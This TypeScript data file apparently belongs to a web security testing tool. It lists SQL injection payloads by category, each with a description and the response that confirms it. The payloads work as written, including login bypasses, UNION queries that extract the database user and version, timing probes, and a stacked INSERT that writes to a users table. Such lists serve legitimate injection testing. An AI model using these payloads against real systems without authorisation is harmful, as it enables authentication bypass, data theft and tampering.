export type SQLiCategory =
  | 'error-based'
  | 'boolean-based'
  | 'time-based'
  | 'union-based'
  | 'comment-injection'
  | 'stacked-queries'

export interface SQLiPayload {
  id: string
  name: string
  category: SQLiCategory
  payload: string
  description: string
  observe: string
}

export const SQLI_CATEGORY_LABELS: Record<SQLiCategory, string> = {
  'error-based': 'Error-Based',
  'boolean-based': 'Boolean-Based',
  'time-based': 'Time-Based Blind',
  'union-based': 'UNION-Based',
  'comment-injection': 'Comment Injection',
  'stacked-queries': 'Stacked Queries',
}

export const SQLI_CATEGORY_COLORS: Record<SQLiCategory, string> = {
  'error-based': 'bg-red-700 text-red-100',
  'boolean-based': 'bg-orange-700 text-orange-100',
  'time-based': 'bg-yellow-700 text-yellow-100',
  'union-based': 'bg-blue-700 text-blue-100',
  'comment-injection': 'bg-purple-700 text-purple-100',
  'stacked-queries': 'bg-rose-800 text-rose-100',
}

export const SQLI_PAYLOADS: SQLiPayload[] = [
  // Error-based
  {
    id: 'err-1',
    name: 'Single quote',
    category: 'error-based',
    payload: "'",
    description: 'Injects a bare single quote to break out of a string literal and trigger a syntax error.',
    observe: 'SQL syntax error in the response (e.g. "You have an error in your SQL syntax").',
  },
  {
    id: 'err-2',
    name: 'Double quote',
    category: 'error-based',
    payload: '"',
    description: 'Targets string literals delimited by double quotes (MSSQL, PostgreSQL non-standard).',
    observe: 'Unclosed string or syntax error message.',
  },
  {
    id: 'err-3',
    name: 'Quote + semicolon',
    category: 'error-based',
    payload: "';",
    description: 'Closes the string and terminates the statement, probing for stacked query support and error exposure.',
    observe: 'Syntax error or unexpected query termination message.',
  },
  {
    id: 'err-4',
    name: 'MySQL extractvalue',
    category: 'error-based',
    payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
    description: 'MySQL: forces an XPath error that embeds the DB version string in the error message.',
    observe: 'Error containing the MySQL version string (e.g. "~8.0.32").',
  },
  {
    id: 'err-5',
    name: 'MSSQL type conversion',
    category: 'error-based',
    payload: "' AND 1=CONVERT(int,'a')-- -",
    description: 'MSSQL: forces a type conversion error that may leak schema or value info.',
    observe: 'Conversion error message from SQL Server.',
  },
  {
    id: 'err-6',
    name: 'PostgreSQL cast error',
    category: 'error-based',
    payload: "' AND 1=CAST('a' AS integer)-- -",
    description: 'PostgreSQL: invalid cast triggers a verbose error.',
    observe: 'ERROR: invalid input syntax for type integer.',
  },

  // Boolean-based
  {
    id: 'bool-1',
    name: 'OR true (string)',
    category: 'boolean-based',
    payload: "' OR '1'='1",
    description: 'Always-true condition. If injected into a WHERE clause, the query returns all rows.',
    observe: 'Page shows more data than usual, or behaves differently than with the original value.',
  },
  {
    id: 'bool-2',
    name: 'OR false (string)',
    category: 'boolean-based',
    payload: "' OR '1'='2",
    description: 'Always-false condition — contrast with the true variant to confirm injection.',
    observe: 'Page shows no results or fewer results than normal.',
  },
  {
    id: 'bool-3',
    name: 'AND true (numeric)',
    category: 'boolean-based',
    payload: '1 AND 1=1',
    description: 'Numeric context: appends a true condition. Response should match the original.',
    observe: 'Same response as the original value — compare with AND 1=2.',
  },
  {
    id: 'bool-4',
    name: 'AND false (numeric)',
    category: 'boolean-based',
    payload: '1 AND 1=2',
    description: 'Numeric context: appends a false condition. Response should differ from AND 1=1.',
    observe: 'Different response (empty, error, or "not found") compared to AND 1=1.',
  },
  {
    id: 'bool-5',
    name: 'AND true (string)',
    category: 'boolean-based',
    payload: "' AND 1=1-- -",
    description: 'String context: always-true condition with comment to discard the rest of the query.',
    observe: 'Normal response — pair with AND 1=2 to confirm.',
  },
  {
    id: 'bool-6',
    name: 'AND false (string)',
    category: 'boolean-based',
    payload: "' AND 1=2-- -",
    description: 'String context: always-false condition. A different response from AND 1=1 confirms injection.',
    observe: 'Empty result set or different page content from the AND 1=1 variant.',
  },

  // Time-based blind
  {
    id: 'time-1',
    name: 'MySQL SLEEP',
    category: 'time-based',
    payload: "' OR SLEEP(5)-- -",
    description: 'MySQL: pauses the DB for 5 seconds. A delayed response confirms blind injection.',
    observe: 'HTTP response takes ~5 seconds longer than baseline.',
  },
  {
    id: 'time-2',
    name: 'MSSQL WAITFOR DELAY',
    category: 'time-based',
    payload: "'; WAITFOR DELAY '0:0:5'-- -",
    description: 'MSSQL: introduces a 5-second delay via WAITFOR.',
    observe: 'Response delayed by ~5 seconds.',
  },
  {
    id: 'time-3',
    name: 'PostgreSQL pg_sleep',
    category: 'time-based',
    payload: "' OR pg_sleep(5)-- -",
    description: 'PostgreSQL: pauses execution for 5 seconds.',
    observe: 'Response delayed by ~5 seconds.',
  },
  {
    id: 'time-4',
    name: 'MySQL conditional sleep',
    category: 'time-based',
    payload: "' AND IF(1=1,SLEEP(5),0)-- -",
    description: 'Conditional delay — fires only if the argument is true. Confirms boolean conditions blindly.',
    observe: 'Delay only if the condition is true; no delay for IF(1=2,...) variant.',
  },
  {
    id: 'time-5',
    name: 'SQLite randomblob',
    category: 'time-based',
    payload: "' AND 1=like('ABCDEFG',upper(hex(randomblob(300000000/2))))-- -",
    description: 'SQLite: CPU-intensive allocation causes a measurable hang without a dedicated sleep function.',
    observe: 'Slow response (duration depends on server CPU).',
  },

  // Union-based
  {
    id: 'union-1',
    name: 'NULL probe — 1 column',
    category: 'union-based',
    payload: "' UNION SELECT NULL-- -",
    description: 'Column-count enumeration starting point. NULL is compatible with any column type.',
    observe: 'No error = 1 column. Error = add more NULLs until it succeeds.',
  },
  {
    id: 'union-2',
    name: 'NULL probe — 2 columns',
    category: 'union-based',
    payload: "' UNION SELECT NULL,NULL-- -",
    description: 'Tests for 2 columns in the original query.',
    observe: 'No error = 2 columns.',
  },
  {
    id: 'union-3',
    name: 'NULL probe — 3 columns',
    category: 'union-based',
    payload: "' UNION SELECT NULL,NULL,NULL-- -",
    description: 'Tests for 3 columns.',
    observe: 'No error = 3 columns.',
  },
  {
    id: 'union-4',
    name: 'Extract current user (MySQL)',
    category: 'union-based',
    payload: "' UNION SELECT user(),NULL,NULL-- -",
    description: 'Once column count is known, extracts the DB user. Adjust NULL count to match your app.',
    observe: 'DB username reflected in the response (e.g. "app_user@localhost").',
  },
  {
    id: 'union-5',
    name: 'Extract database name (MySQL)',
    category: 'union-based',
    payload: "' UNION SELECT database(),NULL,NULL-- -",
    description: 'Extracts the current database name.',
    observe: 'Database name appears in the response.',
  },
  {
    id: 'union-6',
    name: 'Extract version (MySQL)',
    category: 'union-based',
    payload: "' UNION SELECT version(),NULL,NULL-- -",
    description: 'Extracts the database version string.',
    observe: 'DB version string in the response (e.g. "8.0.32").',
  },

  // Comment injection
  {
    id: 'comment-1',
    name: 'Dash-dash comment',
    category: 'comment-injection',
    payload: "'-- -",
    description: 'Closes a string and comments out the rest of the query. Works in MySQL, MSSQL, PostgreSQL.',
    observe: 'Response changes — authentication bypass, missing WHERE conditions, or error disappears.',
  },
  {
    id: 'comment-2',
    name: 'Hash comment (MySQL)',
    category: 'comment-injection',
    payload: "'#",
    description: 'MySQL inline comment. Terminates the query after the injected value.',
    observe: 'Query behaviour changes as if conditions after the comment were removed.',
  },
  {
    id: 'comment-3',
    name: 'Block comment',
    category: 'comment-injection',
    payload: "'/*",
    description: 'Opens a block comment, discarding everything until a matching */.',
    observe: 'Fewer results or different page state from query truncation.',
  },
  {
    id: 'comment-4',
    name: 'Login bypass — dash',
    category: 'comment-injection',
    payload: "admin'-- -",
    description: 'Classic authentication bypass: injects admin as username and comments out the password check.',
    observe: 'Authentication succeeds without a valid password.',
  },
  {
    id: 'comment-5',
    name: 'Login bypass — hash',
    category: 'comment-injection',
    payload: "admin'#",
    description: 'MySQL variant of the login bypass.',
    observe: 'Authentication bypass on MySQL-backed login forms.',
  },

  // Stacked queries
  {
    id: 'stacked-1',
    name: 'Benign SELECT probe',
    category: 'stacked-queries',
    payload: "'; SELECT 1-- -",
    description: 'Probes whether the driver allows multiple statements. Second query is harmless.',
    observe: 'No error or changed response indicates stacked queries are allowed.',
  },
  {
    id: 'stacked-2',
    name: 'Stacked time delay (MSSQL)',
    category: 'stacked-queries',
    payload: "'; WAITFOR DELAY '0:0:3'-- -",
    description: 'Confirms stacked execution via a 3-second time delay in MSSQL.',
    observe: '~3 second response delay confirms stacked query execution.',
  },
  {
    id: 'stacked-3',
    name: 'Stacked INSERT probe',
    category: 'stacked-queries',
    payload: "'; INSERT INTO users(username) VALUES('sqli_probe')-- -",
    description: 'Tests write access via a stacked INSERT. Adjust the table and column to match your schema.',
    observe: 'If the probe row appears in the DB, stacked writes are possible.',
  },
]
